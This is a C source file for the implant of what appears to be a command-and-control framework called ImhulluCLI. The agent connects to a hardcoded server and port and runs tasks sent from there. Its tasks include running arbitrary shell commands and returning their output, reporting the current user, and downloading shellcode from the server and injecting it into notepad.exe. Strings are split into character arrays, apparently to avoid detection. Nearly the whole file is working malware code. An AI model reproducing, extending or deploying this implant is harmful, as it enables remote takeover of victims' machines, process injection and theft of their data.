#include "../include/agent.h"
#include "../include/std.h"
#include "../include/typedefs.h"
#include "../include/http.h"

// will be overwritten by ImhulluCLI
// ImhulluCLI defines these macros when it compiles the agent
// these are here just so IDEs don't complain.
#ifndef SERVER_M
#define SERVER_M '1','9','2','.','1','6','8','.','0','.','1',0
#endif
#ifndef PORT_M
#define PORT_M 5001
#endif
#ifndef UUID_M
#define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
#endif



/**
 * @fn Agent* AgentAllocate
 *
 * @brief Allocates memory for an Agent structure on heap.
 *
 * @param MALLOC malloc: a pointer to the malloc function
 *
 * @return Agent*: a pointer to the allocated Agent structure
 *                 this will be set to NULL if allocation fails.
 *
 * @see AgentCreate()
 * @see AgentFree()
 *
 * @note If allocation fails, the return value is NULL
 * @note Populate the struct members with `AgentPopulate` and free the agent with `AgentFree`
 * @note `api` must have the `malloc` function initialized
 */
Agent* AgentAllocate(MALLOC malloc)
{
    if (malloc == 0) {
        DEBUG_PRINTF_ERROR("%s", "AgentAllocate: malloc is not defined\n");
        return NULL;
    }

    Agent* agent = malloc(sizeof(Agent));

    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentAllocate: Allocation of agent failed\n");
        return NULL;
    }
    return agent;
}


/**
 * @fn BOOL AgentPopulate
 *
 * @brief Populates an agent's members.
 *
 * @param _In_ Agent* agent: a pointer to an agent that will be populated
 * @param _In_ CONST WCHAR remoteServer[REMOTE_SERVER_MAX_LENGTH]: a null terminated WCHAR array that the agent will connect to
 * @param _In_ CONST SIZE_T remoteServerLength: the length of the `remoteServer` string including the null terminator
 * @param _In_ CONST INTERNET_PORT remotePort: the server port to connect to
 * @param _In_ CONST AGENT_INTERVAL interval: the interval in between server callbacks
 *
 * @return BOOL: TRUE if population is successful
 *               FALSE if population fails
 *
 * @note Ensure that the `agent` pointer is valid and points to an allocated `Agent` structure before calling this function.
 *
 * @see AgentAllocate()
 * @see AgentFree()
 *
 * @note If population of a member fails, the function returns FALSE and all the members are considered uninitialized
 * @note Allocate the struct with `AgentAllocate` and free the agent with `AgentFree`
 */
BOOL AgentPopulate(_In_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH], _In_ CONST SIZE_T remoteServerLength, _In_ CONST INTERNET_PORT remotePort, _In_ CONST AGENT_INTERVAL interval)
{
    // if agent pointer is NULL, exit
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: agent is NULL\n");
        return FALSE;
    }

    // if remoteServer is NULL, exit
    if (remoteServer == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: remoteServer is NULL\n");
        return FALSE;
    }

    // if remoteServerLength is more than the allowed length, exit
    if (remoteServerLength > AGENT_REMOTE_SERVER_MAX_LENGTH)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: remoteServerLength is more than AGENT_REMOTE_SERVER_MAX_LENGTH\n");
        return FALSE;
    }

    if (AgentRemoteServerSet(agent, remoteServer, remoteServerLength) == FALSE)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: AgentRemoteServerSet failed\n");
        return FALSE;
    }

    // populate _remotePort
    if (AgentRemotePortSet(agent, remotePort) == FALSE)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: AgentRemotePortSet failed\n");
        return FALSE;
    }

    if (AgentIntervalSet(agent, interval) == FALSE)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: AgentIntervalSet failed\n");
        return FALSE;
    }

    return TRUE;
}


/**
 * @fn VOID AgentFree
 *
 * @brief Frees the memory allocated for an Agent structure.
 *
 * @param _In_ Agent* agent: A pointer to the Agent structure to be freed.
 *
 * @return BOOL: TRUE if freeing is successful
 *               FALSE if freeing fails
 *
 * @note Ensure that the pointer passed to this function is on heap.
 *
 * @see AgentAllocate()
 * @see AgentCreate()
 *
 * @note Allocate the struct with `AgentAllocate` and populate the struct with `AgentPopulate`
 */
BOOL AgentFree(_In_ PAPI api, _In_ Agent* agent)
{
    if (api == NULL || api->malloc == 0) {
        DEBUG_PRINTF_ERROR("%s", "api->malloc or api is null or 0\n");
        return FALSE;
    }

    ((FREE)api->free)(agent);

    return TRUE;
}


/**
 * @fn BOOL AgentRemoteServerSet
 *
 * @brief Change the RemoteServer member of the agent
 *
 * @param _Inout_ Agent* agent: the agent whose member `_remoteServer` will be changed
 *                             if function fails, `_remoteServer` isn't changed
 * @param _In_ WCHAR remoteServer[REMOTE_SERVER_MAX_LENGTH]: a null terminated WCHAR array that the agent will connect to
 * @param _In_ SIZE_T remoteServerLength: the length of the `remoteServer` string including the null terminator
 *
 * @return If function suceeds TRUE
 *         If function fails FALSE
 *
 * @note: If the function fails, the _remoteServer member remains unchanged
 */
BOOL AgentRemoteServerSet(_Inout_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH], _In_ CONST SIZE_T remoteServerLength)
{
    // if agent pointer is NULL, exit
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: agent is NULL\n");
        return FALSE;
    }

    // Check if remoteServer pointer is NULL
    if (remoteServer == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentRemoteServerSet: remoteServer is NULL\n");
        return FALSE;
    }

    // if remoteServerLength is more than the allowed length, exit
    if (remoteServerLength > AGENT_REMOTE_SERVER_MAX_LENGTH)
    {
        DEBUG_PRINTF_ERROR("%s", "remoteServerLength is higher than AGENT_REMOTE_SERVER_MAX_LENGTH\n");
        return FALSE;
    }

    // populate _remoteServer
    int i = 0;
    for (i = 0; i<remoteServerLength && i<AGENT_REMOTE_SERVER_MAX_LENGTH-1; i++)
    {
        agent->_remoteServer[i] = remoteServer[i];
    }

    // ensure we aren't writing out-of-bound
    if (i == 0) {
        agent->_remoteServer[0] = L'\0'; // Handle case where no characters were copied
        DEBUG_PRINTF_WARNING("%s", "AgentRemoteServerSet: remoteServer is empty");
    } else {
        // ensure null termination, override the last byte as it is meant to be a null terminator
        // this checks for the chance that remoteServerLength is less than the actual size of remoteServer
        // which would cause our string to be unterminated since we didn't copy the null byte
        agent->_remoteServer[i-1] = L'\0';
    }
    return TRUE;
}


/**
 * @fn BOOL AgentRemotePortSet
 *
 * @brief Change the RemotePort member of the agent
 *
 * @param _Inout_ Agent* agent: the agent whose member `_remotePort` will be changed
 *                             if function fails, `_remotePort` isn't changed
 * @param _In_ INTERNET_PORT remotePort: the port the agent will connect to
 *
 * @return If function suceeds TRUE
 *         If function fails FALSE
 *
 * @note: make sure remotePort is between 1-65535
 * @note: If the function fails, the _remotePort member remains unchanged
 */
BOOL AgentRemotePortSet(_Inout_ Agent* agent, _In_ INTERNET_PORT remotePort)
{
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentRemotePortSet: agent is null\n");
        return FALSE;
    }
    if (remotePort<1 || remotePort>65535)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentRemotePortSet: remotePort is not in between 1-65535\n");
        return FALSE;
    }

    agent->_remotePort = remotePort;

    return TRUE;
}


/**
 * @fn BOOL AgentIntervalSet
 *
 * @brief Change the `_interval` member of the agent
 *
 * @param _Inout_ Agent* agent: the agent whose `_interval` member will be changed
 *                             if function fails, the interval isn't changed
 * @param _In_ AGENT_INTERVAL: a positive value that will be the interval in milliseconds
 *
 * @return If function succeeds, TRUE
 *         If function fails, FALSE
 *
 * @note If the function fails, the interval remains unchanged
 */
BOOL AgentIntervalSet(_Inout_ Agent* agent, _In_ AGENT_INTERVAL interval)
{
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentIntervalSet: agent is NULL\n");
        return FALSE;
    }
    if (interval < 0)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentIntervalSet: interval is less than 0\n");
        return FALSE;
    }

    agent->_interval = interval;

    return TRUE;
}

/**
 * @fn BOOL AgentTaskMappingsSet
 *
 * @brief Set the `_taskMappings[]` member of the agent
 *
 * @param _Inout_ Agent* agent: the agent whose `_taskMappings` member will be set
 *                             if function fails, the interval isn't changed
 * @param _In_ CONST TaskMapping taskMappings[]: an array of taskMappings
 * @param _In_ CONST DWORD dwNumberOfTaskMappings: the number of TaskMapping structs inside taskMappings
 *
 * @return If function succeeds, TRUE
 *         If function fails, FALSE
 *
 * @note If the function fails, the `_taskMappings` member remains unchanged
 */
/*
BOOL AgentTaskMappingsSet(_Inout_ Agent* agent, _In_ CONST TaskMapping taskMappings[MAX_TASK_MAPPINGS], _In_ CONST DWORD dwNumberOfTaskMappings)
{
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentTaskMappingsSet: agent is NULL\n");
        return FALSE;
    }
    if (taskMappings == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentTaskMappingsSet: taskMappings is NULL\n");
        return FALSE;
    }
    if (dwNumberOfTaskMappings == 0)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentTaskMappingsSet: dwNumberOfTaskMappings is 0\n");
        return FALSE;
    }
    if (dwNumberOfTaskMappings > MAX_TASK_MAPPINGS)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentTaskMappingsSet: dwNumberOfTaskMappings is higher than MAX_TASK_MAPPINGS\n");
        return FALSE;

    }

    return TRUE;
}
*/


/**
 * @fn VOID AgentSleep
 *
 * @brief Suspend the execution of the current thread
 *
 * @param Agent* agent: The sleep time is stored in milliseconds in `agent->_interval`
 *
 * @return This function returns nothing
 */
VOID AgentSleep(_In_ PAPI api, _In_ Agent* agent)
{
    ((SLEEP)api->Sleep)(agent->_interval);
}


// NOTE: Does pEsgStdDll need to be freed upon shutdown?
/**
 * @fn VOID AgentExecuteTask
 *
 * @brief Executes a function and returns the result
 *
 * @param _In_ PAPI api:
 * @param _In_ PESG_STD_API pEsgStdApi:
 * @param _Out_opt_ DLL* pEsgStdDll: pointer to the standard esg dll that may be freed if a Task requires so
 * @param _In_ Task task: a Task struct to use to run a task
 * @param _Out_ CHAR** taskResult: a double pointer to a buffer that receives the task result.
 *                                 this will be set to NULL if the execution fails or if there is no task to run.
 * @param _Out_ DWORD* pdwSizeOfOutput: a pointer to a dword value that will receive the size of the result
 *                                      the data pdwSizeOfOutput will be 0 if execution fails
 *
 * @return BOOL: TRUE if execution successful, FALSE if execution fails or if there is no task to run
 *
 * @note The caller is responsible for freeing the memory allocated for pTaskResult
 * @note If execution fails, the data pointed to by pdwSizeOfOutput is 0
 * @note If execution fails, the return is FALSE otherwise the return is TRUE.
 * @note If execution fails, the data pointed to by `pTaskResult` will be NULL. Ensure to check this before using the result.
 */
BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _Out_opt_ DLL* pEsgStdDll, _In_ Task task, _Out_ CHAR** pTaskResult, _Out_ DWORD* pdwSizeOfOutput)
{
    *pdwSizeOfOutput = 0;
    *pTaskResult = NULL;
    // if json is empty
    // readJsonTask returns a task struct with all fields equal to NULL
    if (task.taskId == NULL)
    {
        DEBUG_PRINTF_WARNING("%s", "AgentExecuteTask: task.taskId is null, probably no task present");
        return FALSE;
    }

    CHAR* orgOutput;  // on heap
    if (my_strcmp(task.taskType, TASK_CMD) == 0)
    {
        if (_AgentExecuteCmd(api, pEsgStdApi, task, pTaskResult, pdwSizeOfOutput) == FALSE)
        {
            DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteCmd failed\n");
            return FALSE;
        }
        return TRUE;
    }
    else if (my_strcmp(task.taskType, TASK_WHOAMI) == 0)
    {
        if (_AgentExecuteWhoami(api, pEsgStdApi, task, pTaskResult, pdwSizeOfOutput) == FALSE)
        {
            DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteWhoami failed\n");
            return FALSE;
        }
        return TRUE;
    }
    else if (my_strcmp(task.taskType, TASK_SHUTDOWN) == 0)
    {
        if (_AgentExecuteShutdown(agent, api, pEsgStdDll, task))
        {
            DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteShutdown failed\n");
            return FALSE;
        }
        return TRUE;
    }
    else if (my_strcmp(task.taskType, TASK_EXECUTE_ASSEMBLY) == 0)
    {
        if (_AgentExecuteAssembly(agent, api, pEsgStdApi, pTaskResult, pdwSizeOfOutput))
        {
            DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteAssembly failed\n");
            return FALSE;
        }
        return TRUE;
    }
    else
    {
        return FALSE;
    }
}

/**
 * @fn BOOL _AgentExecuteCmd
 *
 * @brief Executes a command in the task, and retrieves the result.
 *
 * This function takes a Task struct and pointers to the API and ESG_STD_API structs, executes the command associated
 * with the task, and returns the result of the execution. The result is provided as a string along with its size.
 * The function is a private function that should not be used outside agent.c
 *
 * @param _In_ PAPI api: A pointer to the API strucutre
 * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the ESG_STD_API structure with RunCmd initialized
 * @param _In_ Task task: The task to be executed, which contains the command details.
 * @param _Out_ CHAR** taskResult: A pointer to a character pointer that will receive the result of the command execution.
 * @param _Out_ DWORD* pdwSizeOfOutput: A pointer to a DWORD that will receive the size of the result.
 *
 * @return BOOL Returns TRUE if the command was executed successfully; otherwise, returns FALSE.
 *
 * @note Ensure that the pointers provided for taskResult and pdwSizeOfOutput are valid and allocated
 *       before calling this function. The caller is responsible for freeing the memory allocated for
 *       taskResult after use.
 */
BOOL _AgentExecuteCmd(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput)
{
    if (api == NULL || pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteCmd: Invalid parameters\n");
        return FALSE; // Invalid parameters
    }

    CHAR* orgOutput = NULL;  // on heap
    orgOutput = ((RUNCMD)pEsgStdApi->RunCmd)(task.taskParams, pdwSizeOfOutput);

    if (orgOutput == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteCmd: pEsgStdApi->RunCmd failed\n");
        return FALSE;
    }

    *taskResult = myTrim(api, orgOutput, '\n');

    ((FREE)api->free)(orgOutput);
    orgOutput = NULL;

    if (*taskResult == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteCmd: myTrim returned null");
        return FALSE;
    }

    return TRUE;
}

/**
 * @fn BOOL _AgentExecuteWhoami
 *
 * @brief Executes GetUserNameA Win32 function, and retrieves the result.
 *
 * This function takes a Task struct and pointers to the API and ESG_STD_API structs, executes the task,
 * and returns the result of the execution. The result is provided as a string along with its size.
 * The function is a private function that should not be used outside of agent.c
 *
 * @param _In_ PAPI api: A pointer to the API strucutre
 * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the ESG_STD_API structure with RunCmd initialized
 * @param _In_ Task task: The task to be executed.
 * @param _Out_ CHAR** taskResult: A pointer to a character pointer that will receive the result of the task.
 * @param _Out_ DWORD* pdwSizeOfOutput: A pointer to a DWORD that will receive the size of the result.
 *
 * @return BOOL Returns TRUE if the task was executed successfully; otherwise, returns FALSE.
 *
 * @note Ensure that the pointers provided for taskResult and pdwSizeOfOutput are valid and allocated
 *       before calling this function. The caller is responsible for freeing the memory allocated for
 *       taskResult after use.
 */
BOOL _AgentExecuteWhoami(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput)
{
    *pdwSizeOfOutput = 0;

    if (api == NULL || pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteWhoami: Invalid parameters\n");
        return FALSE; // Invalid parameters
    }

    CHAR* orgOutput = NULL;  // on heap
    orgOutput = ((WHOAMI)pEsgStdApi->Whoami)(pdwSizeOfOutput);

    if (orgOutput == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteWhoami: pEsgStdApi->Whoami failed\n");
        return FALSE;
    }

    *taskResult = myTrim(api, orgOutput, '\n');

    ((FREE)api->free)(orgOutput);
    orgOutput = NULL;

    if (*taskResult == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteWhoami: myTrim returned null");
        return FALSE;
    }

    return TRUE;
}


/**
 * @brief Executes the shutdown process for a given agent and task.
 *
 * This function constructs a JSON response containing the task ID, agent UUID,
 * and the encoded exit output. It then sends this JSON response to a specified
 * remote server and port associated with the agent. After sending the response,
 * it cleans up allocated resources and terminates the current thread.
 *
 * @param _In_ Agent* agent: A pointer to the Agent structure
 * @param _In_ PAPI api: A pointer to the API structure
 * @param _Out_ DLL* pEsgStdDll: A pointer to a DLL structure that will be freed and set to NULL after the operation
 * @param _In_ Task task: The Task structure that contains details about the task being executed
 *
 * @return BOOL Returns TRUE if the shutdown process was successful, otherwise returns FALSE.
 *
 * @note The DLL that gets freed shouldn't matter as the program shuts down after the function.
 *       However, it's still accounted for to be future proof.
 *
 */
BOOL _AgentExecuteShutdown(_In_ Agent* agent, _In_ PAPI api, _Out_ DLL* pEsgStdDll, _In_ Task task)
{
    if (agent == NULL || api == NULL || pEsgStdDll == NULL) {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteShutdown: Invalid parameters\n");
        return FALSE; // Invalid parameters
    }

    if (task.taskId == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteShutdown: task.taskId is NULL, indicates that the task is uninitialized or its creation has failed\n");
        return FALSE;
    }

    // json for the response
    CHAR jsonFormat[] =
    {
    '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '"', '%', 's', '"', ',',
    ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"',
    '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p',
    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}', 0
    };
    WCHAR pathSendTaskOutput[] =
    {
        '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
        't', '/', UUID_M
    };

    CONST DWORD dwEncodedExitOutputSize = 17;
    DWORD totalJsonSize = 0;
    CHAR* json = NULL;  // onheap
    // base64 value of exitSuccess
    CHAR encodedExitOutput[17] = { 'R', 'X', 'h', 'p', 'd', 'F', 'N', '1', 'Y', '2', 'N', 'l', 'c', '3', 'M', '=', 0 };
    totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(task.taskId) + myStrlenA(task.agentUuid);
    json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));

    if (json == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteShutdown: allocation for json has failed");
        return FALSE;
    }

    ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, encodedExitOutput);
    PostRequest(api, agent->_remoteServer, agent->_remotePort, pathSendTaskOutput, json);

    ((FREE)api->free)(pEsgStdDll->pBuffer);
    pEsgStdDll->pBuffer = NULL;
    ((FREE)api->free)(json);
    json = NULL;
    ((FREE)api->free)(task.taskParams);
    task.taskParams = NULL;

    // TODO: Change with ExitProcess
    ((EXITTHREAD)api->ExitThread)(0);
    return TRUE;
}


/**
 * @fn BOOL _AgentExecuteAssembly
 *
 * @brief Executes an assembly injection into a specified application.
 *
 * This function retrieves executable shellcode from a remote server and injects
 * it into the Notepad application. It constructs the necessary parameters for
 * the injection process and allocates memory for the task result, which indicates
 * the execution status of the assembly.
 * // NOTE: The application to inject into should be obtained from the Agent struct
 *
 * @param _In_ Agent* agent: A pointer to the Agent structure that contains information about
 *                           the agent performing the assembly execution.
 * @param _In_ PAPI api: A pointer to the API structure that provides memory allocation and
 *                       other utility functions.
 * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the standard API structure that contains the
 *                                      function for injecting code into a process.
 * @param _Out_ CHAR** pTaskResult: A pointer to a character pointer that will be allocated
 *                                  to store the result of the task execution.
 * @param _Out_ DWORD* pdwSizeOfOutput: A pointer to a DWORD value that receives the size of the
 *                                      allocated data for pTaskResult
 *
 * @return BOOL Returns TRUE if the assembly injection was initiated successfully,
 *               otherwise returns FALSE.
 *
 * @note The function assumes that Notepad is available at the specified path.
 *       It also allocates memory for the task result, which should be freed by
 *       the caller to avoid memory leaks.
 */
BOOL _AgentExecuteAssembly(_In_ Agent* agent, _In_ PAPI api, PESG_STD_API pEsgStdApi, CHAR** pTaskResult, DWORD* pdwSizeOfOutput)
{
    if (agent == NULL || api == NULL || pEsgStdApi == NULL || pTaskResult == NULL || pdwSizeOfOutput == NULL) {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: Invalid parameters\n");
        return FALSE; // Invalid parameters
    }

    // use notepad.exe to inject code into
    CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
    DWORD dwShellcodeSize;
    WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
    LPVOID shellcode = httpGetExecutable(api, &dwShellcodeSize, cAssemblyEndpoint, agent->_remoteServer, agent->_remotePort);

    if (shellcode == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: httpGetExecutable failed\n");
        return FALSE;
    }

    if ( ((INJECTINTOPROCESS)pEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName) == FALSE )
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: calloc for *pTaskResult failed\n");
        return FALSE;
    }

    *pTaskResult = ((CALLOC)api->calloc)(myStrlenA(TASK_EXECUTE_ASSEMBLY)+1, sizeof(CHAR));

    if (*pTaskResult == NULL) {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: calloc for *pTaskResult failed\n");
        return FALSE;
    }

    for (int i = 0; i < myStrlenA(TASK_EXECUTE_ASSEMBLY)+1; i++)
    {
        *pTaskResult[i] = TASK_EXECUTE_ASSEMBLY[i];
    }

    ((FREE)api->free)(shellcode);
    return TRUE;
}

